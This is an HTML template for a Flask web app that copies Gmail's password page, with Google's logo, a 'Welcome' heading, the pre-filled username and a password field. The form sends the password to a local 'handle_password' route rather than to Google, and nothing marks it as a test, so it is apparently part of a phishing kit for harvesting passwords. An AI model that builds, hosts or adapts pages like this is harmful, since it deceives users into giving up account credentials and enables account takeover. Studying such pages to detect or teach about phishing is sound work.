<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Gmail</title>
	<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
	<div class="login-container">
		<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google" class="google-logo">
		<h1>Welcome</h1>
		<div class="username-display">
            		<svg aria-hidden="true" class="person-icon" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
            		{{ username }}
             		<svg aria-hidden="true" class="dropdown-icon" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg>
		</div>

		<form method="post" action="{{ url_for('handle_password') }}">
			<div class="input-group">
				<input type="password" id="password" name="password" placeholder="Enter your password" required>
			</div>

			<div class="show-password-container">
				<input type="checkbox" id="show-password">
				<label for="show-password">Show password</label>
			</div>

			<div class="bottom-container password-bottom-container">
				<button type="button" class="link-button">Forgot password?</button>
				<button type="submit" class="submit-button">Next</button>
			</div>		
		</form>
	</div>
	<script>
		const passwordInput = document.getElementById('password');
		const showPasswordCheckbox = document.getElementById('show-password');
		if (showPasswordCheckbox && passwordInput) {
			showPasswordCheckbox.addEventListener('change', function() {
				passwordInput.type = this.checked ? 'text' : 'password';
			});
		}
	</script>
</body>
</html>
